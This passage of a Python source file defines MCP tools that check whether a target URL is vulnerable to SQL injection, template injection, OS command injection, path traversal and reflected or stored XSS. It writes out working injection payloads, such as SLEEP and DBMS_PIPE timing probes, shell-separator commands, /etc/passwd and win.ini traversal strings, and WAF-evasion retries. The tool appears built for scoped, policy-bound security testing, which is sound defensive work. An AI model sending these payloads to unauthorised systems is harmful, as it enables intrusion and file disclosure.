                profile="readonly_sqli_boolean",
                required_checks=["baseline", "differential_boolean"],
            )
            if verdict == UNCONFIRMED
            else None
        )
        return _result(
            "SQL Injection", target_url,
            verdict,
            "differential_boolean", {"tested": "repeated-boolean-only",
                                     "baseline_stability": round(baseline_stability, 4)}, "-",
            notes="Bounded boolean controls completed; timing and error oracles were not exercised.",
            guard={"transport_ok": trace.complete,
                   "controls": ["repeated baseline", "two boolean pairs", "reversed candidate order"],
                   "limitations": ["numeric and single-quoted boolean comparisons only"]},
            request_evidence=trace.evidence,
            signed_completion=completion_env)

    # 2) Error-based imzalar
    err_sig = re.compile(
        r"(SQL syntax|mysql_fetch|ORA-\d{5}|PostgreSQL.*ERROR|"
        r"SQLite/JDBCDriver|Unclosed quotation mark|quoted string not properly|"
        r"Microsoft OLE DB Provider|valid MySQL result|psql:)", re.I)
    er = send(base_val + "'")
    error_signal = None
    if er.get("ok") and err_sig.search(er.get("text", "")) and not err_sig.search(base.get("text", "")):
        m = err_sig.search(er["text"])
        error_signal = {"payload": base_val + "'", "db_error_signature": m.group(0),
                        "primitive_detected": "database_error_disclosure"}

    # 3) Time-based blind
    timing_baselines = [send(base_val) for _ in range(2)]
    timing_ready = all(item.get("ok") and item.get("status") is not None
                       for item in timing_baselines)
    base_time = _median([item.get("time", 0) for item in timing_baselines]) if timing_ready else 0.0

    def _send_sleep(d):
        return send(f"{base_val}' OR SLEEP({d})-- -", role="timing-probe",
                    timeout=max(DEFAULT_TIMEOUT, d * 3 + 5))
    ok, tinfo = _timing_confirm(_send_sleep, base_time, 2, 4) if timing_ready else (
        False, {"transport_ok": False, "decision": "baseline transport failure"}
    )
    if not ok and timing_ready:
        # Oracle lehçesi: SLEEP yok; koşullu DBMS_PIPE beklemesi aynı istatistiğe tabi
        def _send_oracle_sleep(d):
            payload = (f"{base_val}' || (SELECT CASE WHEN (1=1) THEN "
                       f"DBMS_PIPE.receive_message(('a'),{d}) ELSE NULL END FROM dual) || '")
            return send(payload, role="oracle-timing-probe", timeout=max(DEFAULT_TIMEOUT, d * 3 + 5))
        ok2, tinfo2 = _timing_confirm(_send_oracle_sleep, base_time, 2, 4)
        if ok2:
            ok, tinfo = True, {**tinfo2, "dialect": "oracle_dbms_pipe"}
    if ok:
        return _result("SQL Injection (time-based blind)", target_url, CONFIRMED,
                       "timing_statistical", {"payload": "' OR SLEEP(N)-- -", **tinfo},
                       _reproduction(method, target_url, param=param,
                                     payload=f"{base_val}' OR SLEEP(4)-- -",
                                     body_template=body_template, headers=H, carrier=carrier),
                       notes="Interleaved yanıt örnekleri SLEEP(N) ile orantılı arttı.",
                       guard={
                           "prerequisites": ["two successful timing baselines"],
                           "controls": ["interleaved delays", "stable status", "effect-size threshold"],
                           "transport_ok": True,
                           "decision_rule": "latency must scale with requested delay",
                       })

    if error_signal:
        return _result(
            "SQL Injection candidate (error disclosure)", target_url, INCONCLUSIVE,
            "content_match", {**error_signal, "timing": tinfo},
            _reproduction(method, target_url, param=param, payload=base_val + "'",
                          body_template=body_template, headers=H, carrier=carrier),
            notes="DB hata imzası enjeksiyon hipotezini destekler, ancak tek başına SQLi kanıtı değildir.",
            guard={
                "prerequisites": ["payload-only database error"],
                "controls": ["baseline error absence"],
                "transport_ok": bool(er.get("ok")),
                "decision_rule": "error disclosure requires a second exploit-specific oracle",
                "limitations": ["error signature may be a canned application response"],
            },
            request_evidence=[response_evidence(base, "baseline", 0),
                              response_evidence(er, "error-probe", 0)],
        )

    if differential_candidates:
        return _result(
            "SQL Injection", target_url, INCONCLUSIVE, "differential_boolean",
            {"differential_candidates": differential_candidates, "timing": tinfo}, "-",
            notes="İlk differential sinyal ters sıra kontrolünde tekrarlanmadı.",
            guard={
                "controls": ["reversed request order"],
                "transport_ok": True,
                "decision_rule": "both rounds required",
                "limitations": ["response drift or cache behavior detected"],
            },
        )

    return _result("SQL Injection", target_url, UNCONFIRMED if trace.complete else INCONCLUSIVE,
                   "differential_boolean",
                   {"tested": "repeated-boolean+error+interleaved-time",
                    "baseline_status": base["status"], "timing": tinfo},
                   "-", notes="Completed controls did not confirm SQL injection." if trace.complete
                   else "SQL injection controls did not complete.",
                   guard={"transport_ok": trace.complete,
                          "controls": ["repeated baseline", "boolean pairs", "error probe", "interleaved timing"],
                          "limitations": ["only the submitted parameter and tested dialects were covered"]},
                   request_evidence=trace.evidence)


@mcp.tool()
def validate_ssti(target_url: str, param: str = "", method: str = "GET",
                  body_template: str = "", headers_json: str = "{}", carrier: str = "query",
                  baseline_value: str = "") -> str:
    """Server-Side Template Injection'ı aritmetik oracle ile doğrula. Rastgele
    a,b seçilir; yanıtta a*b SONUCU görünür ama '<a>*<b>' ifadesi GÖRÜNMEZSE
    template render edilmiş demektir (coincidence olasılığı sıfıra yakın).

    Args:
        target_url: Hedef URL
        param: Enjeksiyon parametresi
        method: GET/POST
        body_template: POST için '{{PAYLOAD}}' içeren gövde
        headers_json: Ek başlıklar (JSON)
        carrier: query/form/json/cookie/header/path taşıyıcısı
        baseline_value: Observed benign value when payload is injected in a POST body template.
    """
    from cco_validator_core.controls import ControlTrace

    H = _headers(headers_json)
    norm_carrier = _normalize_carrier(carrier, method)
    trace = ControlTrace()

    def send(payload, role, *, baseline=False):
        response = _send_payload(target_url, payload, param=param, method=method,
                                 body_template=body_template, headers=H, carrier=norm_carrier)
        return trace.observe(response, role, baseline=baseline)

    from cco_validator_core.experiment_context import observed_baseline
    with _direct_context_scope(
        target_url=target_url, param=param, method=method, carrier=norm_carrier, vuln_class="ssti",
    ):
        return _validate_ssti_inner(
            target_url=target_url, param=param, method=method, body_template=body_template,
            H=H, carrier=norm_carrier, trace=trace, send=send,
            baseline_sample=observed_baseline(baseline_value or "cco_probe"),
        )


def _validate_ssti_inner(
    *,
    target_url: str,
    param: str,
    method: str,
    body_template: str,
    H: dict,
    carrier: str,
    trace,
    send,
    baseline_sample: str,
) -> str:
    from cco_validator_core.controls import usable_control

    base = send(baseline_sample, "baseline", baseline=True)
    if not usable_control(base, baseline=True):
        return _result("Server-Side Template Injection", target_url, INCONCLUSIVE,
                       "arithmetic_eval", {"error": base.get("error")}, "-",
                       notes="Baseline isteği başarısız.")

    def _fresh_operands(excluded_products):
        for _ in range(8):
            x = secrets.randbelow(289) + 211
            y = secrets.randbelow(289) + 211
            product = x * y
            if product in excluded_products:
                continue
            if str(product) in base.get("text", ""):
                continue
            return x, y
        return 701, 709

    a, b = _fresh_operands(set())
    a2, b2 = _fresh_operands({a * b})
    engines = {
        "Jinja2/Twig/Nunjucks": {
            "probe": lambda x, y: f"{{{{{x}*{y}}}}}",
            "malformed": lambda x, y: f"{{{{{x}*}}}}",
        },
        "Razor": {
            "probe": lambda x, y: f"@({x}*{y})",
            "malformed": lambda x, y: f"@({x}*)",
        },
        "ERB": {
            "probe": lambda x, y: f"<%= {x}*{y} %>",
            "malformed": lambda x, y: f"<%= {x}* %>",
        },
        "Freemarker": {
            "probe": lambda x, y: f"${{{x}*{y}}}",
            "malformed": lambda x, y: f"${{{x}*}}",
        },
        "Velocity/Mako": {
            "probe": lambda x, y: f"#set($x={x}*{y})$x",
            "malformed": lambda x, y: f"#set($x={x}*)$x",
        },
        "Smarty": {
            "probe": lambda x, y: f"{{{x}*{y}}}",
            "malformed": lambda x, y: f"{{{x}*}}",
        },
    }
    candidates = []
    for engine, templates in engines.items():
        pl1 = templates["probe"](a, b)
        r1 = send(pl1, "ssti-probe-1")
        if not (usable_control(r1, baseline=True) and _ssti_oracle(r1.get("text", ""), a, b)):
            continue
        pl2 = templates["probe"](a2, b2)
        r2 = send(pl2, "ssti-probe-2")
        malformed = templates["malformed"](a, b)
        malformed_resp = send(malformed, "ssti-malformed-control")
        second_ok = usable_control(r2, baseline=True) and _ssti_oracle(r2.get("text", ""), a2, b2)
        malformed_safe = (usable_control(malformed_resp)
                          and not _ssti_oracle(malformed_resp.get("text", ""), a, b))
        if second_ok and malformed_safe:
            engine_detail = engine
            if engine == "Jinja2/Twig/Nunjucks":
                # Ayırt etme: {{7*'7'}} Jinja'da '7777777', Twig'de '49' üretir
                disc = send("{{7*'7'}}", "ssti-engine-hint")
                dtext = disc.get("text", "") if disc.get("ok") else ""
                if "7777777" in dtext:
                    engine_detail = "Jinja2/Nunjucks (string tekrarı)"
                elif "49" in dtext and "49" not in base.get("text", ""):
                    engine_detail = "Twig (sayısal çarpım)"
            return _result(
                "Server-Side Template Injection", target_url, CONFIRMED,
                "arithmetic_eval",
                {
                    "engine_hint": engine,
                    "engine_detail": engine_detail,
                    "payload": pl1,
                    "payload_confirm_round_2": pl2,
                    "malformed_control": malformed,
                    "expected_products": [a * b, a2 * b2],
                    "operands": [[a, b], [a2, b2]],
                    "evaluated": True,
                },
                [
                    _reproduction(method, target_url, param=param, payload=pl1,
                                  body_template=body_template, headers=H, carrier=carrier),
                    _reproduction(method, target_url, param=param, payload=pl2,
                                  body_template=body_template, headers=H, carrier=carrier),
                ],
                notes=(f"İki bağımsız aritmetik probe ({a}*{b} ve {a2}*{b2}) render edildi; "
                       "malformed control evaluate edilmedi."),
                guard={
                    "prerequisites": ["reachable baseline"],
                    "controls": ["second arithmetic confirmation", "malformed template control"],
                    "transport_ok": True,
                    "decision_rule": "two distinct arithmetic probes must evaluate and malformed probe must not",
                },
                request_evidence=[
                    response_evidence(base, "baseline", 0),
                    response_evidence(r1, "ssti-probe-1", 0),
                    response_evidence(r2, "ssti-probe-2", 0),
                    response_evidence(malformed_resp, "ssti-malformed-control", 0),
                ],
            )
        candidates.append({
            "engine_hint": engine,
            "payload": pl1,
            "payload_confirm_round_2": pl2,
            "malformed_control": malformed,
            "second_probe_evaluated": second_ok,
            "malformed_control_safe": malformed_safe,
        })
    if candidates:
        return _result(
            "Server-Side Template Injection candidate", target_url, INCONCLUSIVE,
            "arithmetic_eval",
            {"candidates": candidates, "operands": [[a, b], [a2, b2]]},
            "-",
            notes="İlk aritmetik sinyal görüldü ancak ikinci aritmetik probe ve malformed control birlikte doğrulamadı.",
            guard={
                "prerequisites": ["successful arithmetic candidate"],
                "controls": ["second arithmetic confirmation", "malformed template control"],
                "transport_ok": True,
                "decision_rule": "single arithmetic hit is insufficient",
                "limitations": ["coincidental rendering or reflective formatting possible"],
            },
        )
    ssti_verdict = UNCONFIRMED if trace.complete else INCONCLUSIVE
    ssti_completion = (
        _build_validator_completion(
            target_url=target_url,
            param=param,
            method=method,
            carrier=carrier,
            profile="readonly_ssti_arithmetic",
            required_checks=["baseline", "arithmetic_eval"],
        )
        if ssti_verdict == UNCONFIRMED
        else None
    )
    return _result("Server-Side Template Injection", target_url, ssti_verdict,
                   "arithmetic_eval", {"operands": [[a, b], [a2, b2]], "engines_tested": list(engines)},
                   "-", notes="Completed arithmetic probes did not evaluate." if trace.complete
                   else "Arithmetic controls did not complete.",
                   guard={"transport_ok": trace.complete,
                          "controls": ["successful baseline", "arithmetic probes for each tested engine"],
                          "limitations": ["only the submitted parameter and listed template syntaxes were covered"]},
                   request_evidence=trace.evidence,
                   signed_completion=ssti_completion)


@mcp.tool()
def validate_command_injection(target_url: str, param: str = "", method: str = "GET",
                               body_template: str = "", headers_json: str = "{}") -> str:
    """OS Command Injection'ı echo-token + time-based oracle ile doğrula.
    Önce benzersiz token echo'sunu yanıtta arar (kör değilse); olmadıysa
    sleep ile statistical zamanlama kontrolü yapar.

    Args:
        target_url: Hedef URL
        param: Enjeksiyon parametresi
        method: GET/POST
        body_template: POST gövde şablonu ('{{PAYLOAD}}')
        headers_json: Ek başlıklar (JSON)
    """
    H = _headers(headers_json)
    token = "CCOCMD" + secrets.token_hex(4).upper()
    split_at = len(token) // 2
    left, right = token[:split_at], token[split_at:]
    base = _send_payload(target_url, "cco", param=param, method=method,
                         body_template=body_template, headers=H)
    if not base.get("ok"):
        return _result("OS Command Injection", target_url, INCONCLUSIVE, "echo_token",
                       {"error": base.get("error")}, "-", notes="Baseline isteği başarısız.")
    # 1) echo-token (non-blind)
    command = f"printf '%s%s' '{left}' '{right}'"
    echo_payloads = [f"; {command}", f"| {command}", f"&& {command}",
                     f"$({command})", f"`{command}`", f"%0a{command}"]
    for pl in echo_payloads:
        r = _send_payload(target_url, pl, param=param, method=method,
                          body_template=body_template, headers=H)
        if (token not in pl and r.get("ok") and token in r.get("text", "")
                and token not in base.get("text", "")):
            return _result("OS Command Injection", target_url, CONFIRMED, "echo_token",
                           {"payload": pl, "output_token_sha256": hashlib.sha256(token.encode()).hexdigest(),
                            "full_token_absent_from_request": True},
                           _reproduction(method, target_url, param=param, payload=pl,
                                         body_template=body_template, headers=H),
                           notes="Request içinde bulunmayan birleşik token komut çıktısında oluştu.",
                           guard={
                               "prerequisites": ["reachable baseline"],
                               "controls": ["full output token absent from request"],
                               "transport_ok": True,
                               "decision_rule": "server must construct the token from command fragments",
                           },
                           request_evidence=[response_evidence(base, "baseline", 0),
                                             response_evidence(r, "command-probe", 0)])
    # 2) time-based blind
    timing_baselines = [_send_payload(target_url, "cco", param=param, method=method,
                                      body_template=body_template, headers=H) for _ in range(2)]
    timing_ready = all(item.get("ok") and item.get("status") is not None
                       for item in timing_baselines)
    base_time = _median([item.get("time", 0) for item in timing_baselines]) if timing_ready else 0.0

    def _send_sleep(d):
        return _send_payload(target_url, f"; sleep {d}", param=param, method=method,
                             body_template=body_template, headers=H,
                             timeout=max(DEFAULT_TIMEOUT, d * 3 + 5))
    ok, tinfo = _timing_confirm(_send_sleep, base_time, 2, 4) if timing_ready else (
        False, {"transport_ok": False, "decision": "baseline transport failure"}
    )
    if ok:
        return _result("OS Command Injection (blind/time-based)", target_url, CONFIRMED,
                       "timing_statistical", {"payload": "; sleep N", **tinfo},
                       _reproduction(method, target_url, param=param, payload="; sleep 4",
                                     body_template=body_template, headers=H),
                       notes="Interleaved yanıt örnekleri sleep N ile orantılı arttı.",
                       guard={
                           "prerequisites": ["two successful timing baselines"],
                           "controls": ["interleaved delays", "stable status", "effect-size threshold"],
                           "transport_ok": True,
                           "decision_rule": "latency must scale with requested delay",
                       })
    return _result("OS Command Injection", target_url, UNCONFIRMED, "echo_token",
                   {"tested": "fragmented-output-token+interleaved-time", "timing": tinfo}, "-",
                   notes="Komut çıktısı/gecikme gözlenmedi.")


@mcp.tool()
def validate_path_traversal(target_url: str, param: str = "", method: str = "GET",
                            body_template: str = "", headers_json: str = "{}",
                            carrier: str = "query", baseline_value: str = "") -> str:
    """Validate file reads against an observed baseline and bounded controls.

    A path_traversal.application_files program policy selects synthetic files
    only. Otherwise the existing passwd/win.ini signature corpus is used.
    Missing/failed controls remain INCONCLUSIVE; no file contents are retained.

    Args:
        target_url: Hedef URL
        param: Dosya yolu parametresi (örn 'file', 'page')
        method: GET/POST
        body_template: POST gövde şablonu ('{{PAYLOAD}}')
        headers_json: Ek başlıklar (JSON)
        carrier: query/path/header/cookie taşıyıcısı
        baseline_value: Gözlenen benign değer; query için URL'den alınabilir
    """
    from cco_validator_core.traversal import application_files, baseline_sample, missing_file_path, usable_response
    from cco_validator_core.evidence import current_scope_revision, current_policy_hash

    H = _headers(headers_json)
    trace = []
    revision = current_scope_revision(), current_policy_hash()

    def context_is_current():
        return revision == (current_scope_revision(), current_policy_hash())

    def send(value, role):
        if not context_is_current():
            raise ValueError("traversal request context changed")
        response = _send_payload(target_url, value, param=param, method=method,
                                 body_template=body_template, headers=H, carrier=carrier,
                                 allow_redirects=False)
        trace.append(response_evidence(response, role, 0))
        if not context_is_current():
            raise ValueError("traversal request context changed")
        return response

    def incomplete(reason):
        return _result("Path Traversal / LFI", target_url, INCONCLUSIVE, "file_signature",
                       {"control_incomplete": True}, "-", notes=reason,
                       guard={"transport_ok": False, "controls": [row["role"] for row in trace]},
                       request_evidence=trace)

    try:
        if carrier not in {"query", "path", "header", "cookie"}:
            raise ValueError("unsupported traversal parameter carrier")
        benign = baseline_sample(target_url, param, carrier, baseline_value)
        scripts = os.path.abspath(os.path.join(_SERVER_DIR, "..", "..", "scripts"))
        if scripts not in sys.path:
            sys.path.insert(0, scripts)
        from policy_engine import PolicyEngine, ScopeResolver
        engine = PolicyEngine()
        rule = engine.program_policy.get("path_traversal")
        files = None if rule is None else application_files(
            rule, target_url, param, carrier, ScopeResolver(scope_file=engine.scope_file).permits_url)
        if files is not None and (method.upper() != "GET" or body_template):
            raise ValueError("application file validation permits read-only GET requests")
        base = send(benign, "baseline")
        if not usable_response(base, baseline=True):
            return incomplete("Observed benign baseline did not succeed.")
        if files is not None:
            controls = ["benign baseline", "direct name", "missing file", "traversal", "repeat"]
            for file in files:
                path, marker = file["path"], file["marker"]
                if marker in base.get("text", ""):
                    return incomplete("Declared marker is already present in the benign baseline.")
                direct = send(path.rsplit("/", 1)[-1], "direct-name")
                if not usable_response(direct) or marker in direct.get("text", ""):
                    return incomplete("Direct-name control cannot establish a directory boundary.")
                missing = send(missing_file_path(path, secrets.token_hex(8)), "missing-file")
                if not usable_response(missing) or marker in missing.get("text", ""):
                    return incomplete("Missing-file control cannot exclude static or wildcard content.")
                probe = send(path, "traversal-probe")
                if not usable_response(probe):
                    return incomplete("Traversal probe failed or returned an ambiguous status.")
                repeat = send(path, "traversal-repeat")
                if not usable_response(repeat):
                    return incomplete("Traversal repeat control did not complete.")
                hit = marker in probe.get("text", "")
                repeat_hit = marker in repeat.get("text", "")
                if (hit != repeat_hit or (hit and (not usable_response(probe, baseline=True)
                                                   or not usable_response(repeat, baseline=True)))):
                    return incomplete("Declared marker was not reproduced in successful traversal responses.")
                if hit:
                    return _result("Path Traversal / LFI", target_url, CONFIRMED, "file_signature",
                        {"payload": path, "application_file": True,
                         "marker_sha256": hashlib.sha256(marker.encode()).hexdigest()},
                        _reproduction(method, target_url, param=param, payload=path,
                                      body_template=body_template, headers=H, carrier=carrier),
                        notes="Declared synthetic file marker appeared only with the traversal path and repeated.",
                        guard={"transport_ok": True, "controls": controls,
                               "prerequisites": ["declared synthetic file", "successful observed baseline"],
                               "decision_rule": "marker absent in baseline/direct/missing controls, present in both traversal responses"},
                        request_evidence=trace)
            completion_env = None
            try:
                from cco_validator_core.evidence import current_validation_context, redact_url
                import evidence_trust as _trust
                if not _trust.public_only():
                    from signed_completion import build_signed_completion, compute_check_revision
                    ctx = current_validation_context()
                    req_checks = ["baseline", "direct-name", "missing-file", "traversal-probe", "traversal-repeat"]
                    scope_rev, pol_hash = revision
                    safe_url = redact_url(target_url)
                    completion_env = build_signed_completion(
                        run_id=str(ctx.get("run_id") or "validator-standalone"),
                        target=safe_url,
                        url=safe_url,
                        param=param,
                        method=method.upper(),
                        carrier=carrier,
                        identity=str(ctx.get("identity") or "anonymous"),
                        profile="readonly_traversal_application_files",
                        target_scope=scope_rev,
                        check_revision=compute_check_revision(
                            scope_rev, pol_hash, "readonly_traversal_application_files", req_checks
                        ),
                        required_checks=req_checks,
                        completed_checks=req_checks,
                        completion_status="completed_clean",
                        findings_count=0,
                    )
            except (ImportError, ValueError, OSError):
                completion_env = None
            return _result("Path Traversal / LFI", target_url, UNCONFIRMED, "file_signature",
                {"application_files_tested": len(files)}, "-",
                notes="Completed declared file checks did not expose the expected markers.",
                guard={"transport_ok": True, "controls": controls,
                       "limitations": ["only declared files and exact traversal paths were tested"]},
                request_evidence=trace,
                signed_completion=completion_env)
    except (ValueError, TypeError, OSError):
        return incomplete("Traversal baseline, declaration or request context is unavailable or changed.")

    base_text = base.get("text", "")
    baseline_has_file_signature = bool(
        LINUX_FILE_SIG.search(base_text) or WIN_FILE_SIG.search(base_text)
        or _decoded_linux_signature(base_text)
    )
    if baseline_has_file_signature:
        return _result(
            "Path Traversal / LFI", target_url, INCONCLUSIVE, "file_signature",
            {"baseline_contains_file_signature": True},
            "-",
            notes="Baseline yanıtı zaten passwd/win.ini imzası içeriyor; traversal ile ilişki kurulamadı.",
            guard={
                "prerequisites": ["benign baseline free of target file signatures"],
                "controls": ["baseline signature check", "baseline base64 signature check"],
                "transport_ok": True,
                "decision_rule": "file signature must appear only after traversal payload",
                "limitations": ["endpoint may serve static documentation or fixture content"],
            },
            request_evidence=trace,
        )
    payloads = [
        "../../../../../../etc/passwd",
        "....//....//....//....//etc/passwd",
        "..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "/etc/passwd",
        "php://filter/convert.base64-encode/resource=/etc/passwd",
        "..\\..\\..\\..\\windows\\win.ini",
        "..%5c..%5c..%5cwindows%5cwin.ini",
    ]
    for pl in payloads:
        try:
            r = send(pl, "traversal-probe")
        except (ValueError, TypeError, OSError):
            return incomplete("Traversal request context changed.")
        if not usable_response(r):
            return incomplete("Traversal probe or transport did not complete.")
        txt = r.get("text", "")
        lm = LINUX_FILE_SIG.search(txt)
        wm = WIN_FILE_SIG.search(txt)
        decoded_match = _decoded_linux_signature(txt) if pl.startswith("php://filter") else None
        if (lm or wm or decoded_match) and not usable_response(r, baseline=True):
            return incomplete("File signature appeared in an unsuccessful response.")
        if lm and not baseline_has_file_signature:
            return _result("Path Traversal / LFI", target_url, CONFIRMED, "file_signature",
                           {"payload": pl, "signature": lm.group(0), "file": "/etc/passwd"},
                           _reproduction(method, target_url, param=param, payload=pl,
                                          body_template=body_template, headers=H, carrier=carrier),
                           notes="/etc/passwd içeriği yalnız traversal payload'ıyla döndü.",
                           guard={"prerequisites": ["successful benign baseline"],
                                  "controls": ["file signature absent from baseline"],
                                  "transport_ok": True},
                           request_evidence=trace)
        if wm and not baseline_has_file_signature:
            return _result("Path Traversal / LFI", target_url, CONFIRMED, "file_signature",
                           {"payload": pl, "signature": wm.group(0), "file": "win.ini"},
                           _reproduction(method, target_url, param=param, payload=pl,
                                          body_template=body_template, headers=H, carrier=carrier),
                           notes="win.ini içeriği yalnız traversal payload'ıyla döndü.",
                           guard={"prerequisites": ["successful benign baseline"],
                                  "controls": ["file signature absent from baseline"],
                                  "transport_ok": True},
                           request_evidence=trace)
        # base64 php filter
        if pl.startswith("php://filter"):
            if decoded_match and not baseline_has_file_signature:
                return _result("Path Traversal / LFI (php filter)", target_url,
                               CONFIRMED, "file_signature",
                               {"payload": pl, "decoded_signature": decoded_match.group(0)},
                               _reproduction(method, target_url, param=param, payload=pl,
                                             body_template=body_template, headers=H, carrier=carrier),
                               notes="php://filter çıktısında baseline'da olmayan passwd imzası çözüldü.",
                               guard={"prerequisites": ["successful benign baseline"],
                                      "controls": ["decoded signature absent from baseline"],
                                      "transport_ok": True},
                               request_evidence=trace)
    return _result("Path Traversal / LFI", target_url, UNCONFIRMED, "file_signature",
                   {"payloads_tested": len(payloads)}, "-",
                   notes="Bilinen dosya imzası elde edilemedi.",
                   guard={"transport_ok": True, "controls": ["successful observed baseline", "complete signature corpus"],
                          "limitations": ["absence of known signatures does not exclude application-file traversal"]},
                   request_evidence=trace)


@mcp.tool()
def validate_xss_reflection(target_url: str, param: str = "", method: str = "GET",
                            body_template: str = "", headers_json: str = "{}", carrier: str = "query") -> str:
    """Check reflection, then policy-enabled Chromium execution on GET queries.
    Raw HTML reflection alone remains INCONCLUSIVE. xss_execution.enabled
    permits a bounded browser check with baseline/inert controls and two
    independently correlated alert nonces, under the same request context.

    Args:
        target_url: Hedef URL
        param: Yansıyan parametre
        method: GET/POST
        body_template: POST gövde şablonu ('{{PAYLOAD}}')
        headers_json: Ek başlıklar (JSON)
    """
    from cco_validator_core.controls import usable_control
    from cco_validator_core.evidence import current_scope_revision, current_policy_hash

    H = _headers(headers_json)
    revision = current_scope_revision(), current_policy_hash()
    from cco_validator_core.experiment_context import has_experiment, observed_baseline
    controls = []
    if has_experiment():
        base = _send_payload(target_url, observed_baseline(""), param=param, method=method,
                             body_template=body_template, headers=H, carrier=carrier)
        controls.append(response_evidence(base, "baseline", 0))
        if not usable_control(base, baseline=True):
            return _result("Reflected XSS", target_url, INCONCLUSIVE, "unescaped_reflection",
                {}, "-", notes="Invalid observed baseline; reflection probe deferred.",
                guard={"transport_ok": False}, request_evidence=controls)
    canary = "cco" + secrets.token_hex(4)
    raw = f'<{canary}>"\'</{canary}>'
    r = _send_payload(target_url, raw, param=param, method=method,
                      body_template=body_template, headers=H, carrier=carrier)
    xss_retry = None
    if response_is_waf_block(r):
        for variant in mutation_sets(raw, "xss_reflected", r, limit=MAX_WAF_RETRIES):
            mutated = variant.get("payload") or apply_ops(raw, variant.get("operators") or [])
            if mutated == raw:
                continue
            r = _send_payload(target_url, mutated, param=param, method=method,
                              body_template=body_template, headers=H, carrier=carrier)
            xss_retry = {"operators": variant.get("operators"), "payload": mutated,
                         "vendor": vendor_from_response(r)}
            if not response_is_waf_block(r):
                raw = mutated
                break
    if not usable_control(r, baseline=True):
        return _result("Reflected XSS", target_url, INCONCLUSIVE, "unescaped_reflection",
                       {"error": r.get("error")}, "-", notes="Reflection probe did not reach a successful response.",
                       guard={"transport_ok": False},
                       request_evidence=controls + [response_evidence(r, "reflection-probe", 0)])
    txt = r.get("text", "")
    if has_experiment():
        control = _send_payload(target_url, observed_baseline(""), param=param, method=method,
                                body_template=body_template, headers=H, carrier=carrier)
        controls.append(response_evidence(control, "negative-control", 0))
        if not usable_control(control, baseline=True):
            return _result("Reflected XSS", target_url, INCONCLUSIVE, "unescaped_reflection",
                {}, "-", notes="Observed negative control failed.", guard={"transport_ok": False},
                request_evidence=controls + [response_evidence(r, "reflection-probe", 0)])
    raw_tag = f"<{canary}>"
    enc_tag = f"&lt;{canary}&gt;"
    trace = controls[:1] + [response_evidence(r, "reflection-probe", 0)] + controls[1:]
    if raw_tag in txt:
        idx = txt.find(raw_tag)
        window = txt[max(0, idx - 120):idx]
        in_script = "<script" in window.lower() and "</script" not in window.lower()
        context = "javascript (<script>)" if in_script else "HTML body/attribute"
        content_type = next((str(value) for key, value in (r.get("headers") or {}).items()
                             if key.lower() == "content-type"), "")
        reflection = {"verdict": CONFIRMED, "marker_sha256": hashlib.sha256(canary.encode()).hexdigest(),
                      "reflected_raw": True, "context_hint": context, "content_type": content_type}
        if carrier == "query" and content_type.split(";", 1)[0].strip().lower() in {"text/html", "application/xhtml+xml"}:
            from cco_validator_core import xss_execution
            checked = xss_execution.validate(target_url, param, H, method, body_template, revision)
            if checked is not None:
                plans, execution = checked
                outcome = xss_execution.verdict(execution, plans)
                return _result("Reflected XSS", target_url, outcome, "browser_execution",
                    {"reflection": reflection, "execution": {
                        **{key: value for key, value in execution.items() if key != "request_evidence"},
                        "verdict": outcome, "observed": outcome == CONFIRMED},
                     "primitive_confirmed": "javascript_execution" if outcome == CONFIRMED else "unescaped_html_reflection"},
                    [_reproduction("GET", plan["url"], headers=H) for plan in plans],
                    notes="Chromium execution requires fresh marker-correlated alerts in both probe rounds and silent controls.",
                    guard={"transport_ok": execution.get("completed") is True,
                           "prerequisites": ["successful HTML reflection", "policy-enabled scoped browser execution"],
                           "controls": ["baseline", "inert-control", "execution-probe", "execution-repeat"],
                           "decision_rule": "two exact-URL nonce-correlated alerts with silent baseline and inert controls",
                           "limitations": ["bounded reflected GET/query payload only"]},
                    request_evidence=trace + execution.get("request_evidence", []))
        return _result(
            "Reflected XSS candidate", target_url, INCONCLUSIVE, "unescaped_reflection",
            {
                "reflection": reflection,
                "execution": {"verdict": INCONCLUSIVE, "observed": False},
                "primitive_confirmed": "unescaped_html_reflection",
                **({"waf_retry": xss_retry} if xss_retry else {}),
            },
            _reproduction(method, target_url, param=param, payload=raw,
                          body_template=body_template, headers=H, carrier=carrier),
            notes="Kaçışsız HTML yansıması doğrulandı; JavaScript execution kanıtı olmadığı için XSS verdict'i INCONCLUSIVE.",
            severity="medium",
            guard={
                "prerequisites": ["successful reflection probe"],
                "controls": ["raw marker distinguished from HTML-encoded marker"],
                "transport_ok": True,
                "decision_rule": "reflection alone cannot confirm script execution",
                "limitations": ["browser execution artifact required for confirmed XSS"],
            },
            request_evidence=trace,
        )
    if enc_tag in txt:
        return _result("Reflected XSS", target_url, UNCONFIRMED, "unescaped_reflection",
                       {"marker": canary, "reflected_raw": False, "html_encoded": True},
                       "-", notes="Marker yansıdı ama HTML-encode edildi (&lt;) → korumalı.",
                       guard={"transport_ok": True, "controls": ["successful reflection probe", "encoded marker"],
                              "limitations": ["only this reflection payload was tested; browser execution was not checked"]},
                       request_evidence=trace)
    return _result("Reflected XSS", target_url, UNCONFIRMED, "unescaped_reflection",
                   {"marker": canary, "reflected": False}, "-",
                   notes="Marker yanıtta yansımadı.",
                   guard={"transport_ok": True, "controls": ["successful reflection probe", "marker absent"],
                          "limitations": ["only this reflection payload was tested; browser execution was not checked"]},
                   request_evidence=trace)


@mcp.tool()
def validate_stored_reflection(write_url: str, read_url: str, field: str = "comment",
                               method: str = "POST", headers_json: str = "{}",
                               read_headers_json: str = "") -> str:
    """Stored/ikinci-derece yansima oracle'i: YAZ -> OKU canary akisi.

    Disiplin: (1) yazmadan once okuma yuzeyinde canary YOK (negatif kontrol,
    kirlenmis yuzey -> INCONCLUSIVE), (2) canary yazilir, (3) okuma yuzeyinde
    canary HAM gorunurse kalici kacissiz yansima primitifi CONFIRMED; genel
    verdict execution kaniti olmadan INCONCLUSIVE kalir (reflected XSS ile
    ayni kural). Encode edilmis/eksik -> UNCONFIRMED.

    Args:
        write_url: Kaydin yazildigi URL (form POST/PUT)
        read_url: Kaydin okundugu/goruntulendigi URL
        field: Yazma alan adi
        method: Yazma metodu (POST/PUT)
        headers_json: Yazma basliklari (kimlik dahil) JSON
        read_headers_json: Okuma basliklari (bos ise yazma basliklari kullanilir)
    """
    H = _headers(headers_json)
    RH = _headers(read_headers_json) if read_headers_json else H
    canary = "cco" + secrets.token_hex(6)
    raw = f"<{canary}>\"'</{canary}>"

    base = _request("GET", read_url, headers=RH, allow_redirects=False)
